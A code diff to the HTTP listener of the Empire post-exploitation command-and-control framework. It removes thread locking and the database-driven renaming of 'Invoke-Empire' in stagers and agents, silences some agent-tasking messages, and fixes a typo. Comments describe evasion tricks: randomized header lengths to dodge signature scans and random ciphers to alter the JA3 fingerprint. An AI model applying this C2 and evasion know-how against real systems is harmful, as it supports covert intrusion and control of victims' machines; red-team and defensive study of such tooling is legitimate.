@@ -10,7 +10,6 @@ import time
 import copy
 import json
 import sys
-import threading
 from pydispatch import dispatcher
 from flask import Flask, request, make_response, send_from_directory
 
@@ -144,22 +143,8 @@ class Listener(object):
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
-        # used to protect self.http and self.mainMenu.conn during threaded listener access
-        self.lock = threading.Lock()
-
         # randomize the length of the default_response and index_page headers to evade signature based scans
         self.header_offset = random.randint(0,64)
-
-    # this might not be necessary. Could probably be achieved by just callingg mainmenu.get_db but all the other files have
-    # implemented it in place. Might be worthwhile to just make a database handling file
-    def get_db_connection(self):
-        """
-        Returns the cursor for SQLlite DB
-        """
-        self.lock.acquire()
-        self.mainMenu.conn.row_factory = None
-        self.lock.release()
-        return self.mainMenu.conn
 
     def default_response(self):
          """
@@ -396,16 +381,6 @@ class Listener(object):
             stager = f.read()
             f.close()
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            conn = self.get_db_connection()
-            self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
-            self.lock.release()
-            stager = stager.replace("Invoke-Empire", replacement[0])
-
             # make sure the server ends with "/"
             if not host.endswith("/"):
                 host += "/"
@@ -487,17 +462,6 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
             code = f.read()
             f.close()
-
-
-            conn = self.get_db_connection()
-            self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
-            self.lock.release()
-
-            code = code.replace("Invoke-Empire", replacement[0])
 
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -782,7 +746,7 @@ class Listener(object):
                                 listenerName = self.options['Name']['Value']
                                 message = "[*] Agent from {} retrieved taskings".format(clientIP)
                                 signal = json.dumps({
-                                    'print': True,
+                                    'print': False,
                                     'message': message
                                 })
                                 dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -824,7 +788,6 @@ class Listener(object):
             if dataResults and len(dataResults) > 0:
                 for (language, results) in dataResults:
                     if isinstance(results, str):
-
                         results = results.encode('UTF-8')
                     if results:
                         if results.startswith(b'STAGE2'):
@@ -856,11 +819,11 @@ class Listener(object):
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
-                        elif results == 'VALID':
+                        elif results == b'VALID':
                             listenerName = self.options['Name']['Value']
                             message = "[*] Valid results return by {}".format(clientIP)
                             signal = json.dumps({
-                                'print': True,
+                                'print': False,
                                 'message': message
                             })
                             dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
@@ -891,7 +854,7 @@ class Listener(object):
                 context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 #setting the cipher list allows for modification of the JA3 signature. Select a random cipher to change
                 #it every time the listener is launched
-                ipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
+                cipherlist = ["ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-SHA384",
                              "ECDHE-RSA-AES256-SHA", "AES256-SHA256", "AES128-SHA256"]
                 selectciph = random.choice(cipherlist)
                 context.set_ciphers(selectciph)
